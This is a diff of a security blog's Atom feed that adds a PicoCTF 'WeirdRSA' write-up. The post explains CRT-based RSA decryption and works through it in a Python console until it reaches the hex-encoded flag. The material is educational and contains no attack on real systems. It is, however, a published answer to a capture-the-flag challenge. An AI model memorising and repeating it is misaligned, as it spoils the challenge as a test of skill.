@@ -1,6 +1,158 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-04-02T20:00:56+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Overthewire.org - Behemoth 1 -&amp;gt; 2</title><link href="http://localhost:4000/overthewire.org-behemoth-2/" rel="alternate" type="text/html" title="Overthewire.org - Behemoth 1 -&gt; 2" /><published>2017-04-02T00:00:00+00:00</published><updated>2017-04-02T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-behemoth-2</id><content type="html" xml:base="http://localhost:4000/overthewire.org-behemoth-2/">&lt;h1&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-04-14T17:34:32+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">PicoCTF - WeirdRSA</title><link href="http://localhost:4000/picoctf-weird-rsa/" rel="alternate" type="text/html" title="PicoCTF - WeirdRSA" /><published>2017-04-14T00:00:00+00:00</published><updated>2017-04-14T00:00:00+00:00</updated><id>http://localhost:4000/picoctf-weird-rsa</id><content type="html" xml:base="http://localhost:4000/picoctf-weird-rsa/">&lt;h1&gt;WeirdRSA - 90 PTS&lt;/h1&gt;
 
-&lt;p&gt;Today we're going to attack another reverse engineering challenge from &lt;b&gt;Behemoth&lt;/b&gt; series, to improve our Wknowledge in reverse engineering.  &lt;/p&gt;
+&lt;p&gt;We recovered some data. It was labeled as RSA, but what in the world are &quot;dq&quot; and &quot;dp&quot;? Can you decrypt the ciphertext for us? &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;c: 95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885
+p: 11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243
+q: 12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629
+dp: 8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961
+dq: 3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Firstly let's take a quick look at the &lt;a href=&quot;https://en.wikipedia.org/wiki/RSA_(cryptosystem)&quot;&gt;Wikipedia&lt;/a&gt; page about RSA cryptosystem. We can easily see that values named as &lt;b&gt;dp&lt;/b&gt; and &lt;b&gt;dq&lt;/b&gt; are used in the Chinese Remainder algorithm,  which is used as the algorithm in many popular crypto libraries, due to it's efficiency. Let's view the equations. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;dP = (1/e) mod (p-1)
+dQ = (1/e) mod (q-1)
+qInv = (1/q) mod p
+
+m1 = c^dP mod p
+m2 = c^dQ mod q
+h = qInv * (m1 - m2) mod p
+m = m2 + h * q&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, we have everything right in the provided data. The only thing that concernes me is the &lt;b&gt;qInv&lt;/b&gt; variable, which proved by this &lt;a href=&quot;http://www.di-mgt.com.au/crt_rsa.html&quot;&gt;paper&lt;/a&gt; states to be modular inverse, and can be calculated using &lt;a href=&quot;http://www.di-mgt.com.au/euclidean.html&quot;&gt;Euclidean Algorithm&lt;/a&gt;. &lt;/p&gt;
+
+&lt;p&gt;Quick google for the Python code calculating modular inverse, gives us this code. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;modinv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'modular inverse does not exist'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;i&gt;Thanks &lt;a href=&quot;http://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python&quot;&gt;Märt&lt;/a&gt;!&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;Let's load the variables into the Python console. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@W3ndige&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;3.6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2017&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;6.3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20170109&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can add the modular inverse code, and calculate all the missing parts. We can also use Python's pow which will speed up the calculations as stated in the documentation: &lt;/p&gt;
+
+&lt;p&gt;&lt;i&gt;&lt;b&gt;pow(x, y[, z])&lt;/b&gt; - return x to the power y; if z is present, return x to the power y, modulo z (computed more efficiently than pow(x, y) % z).&lt;/i&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;modinv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'modular inverse does not exist'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qinv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modinv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qinv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;149135670063399521704490559489300383724787675131107361956792519054534529857&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We have the message. Last thing will be to turn it into a hexadecimal number, and calculate the ASCII characters, as we know we have to decrypt the ciphertext. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'0x5468657265735f6d6f72655f7468616e5f6f6e655f7761795f746f5f525341'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'5468657265735f6d6f72655f7468616e5f6f6e655f7761795f746f5f525341'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;zip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])])&lt;/span&gt;
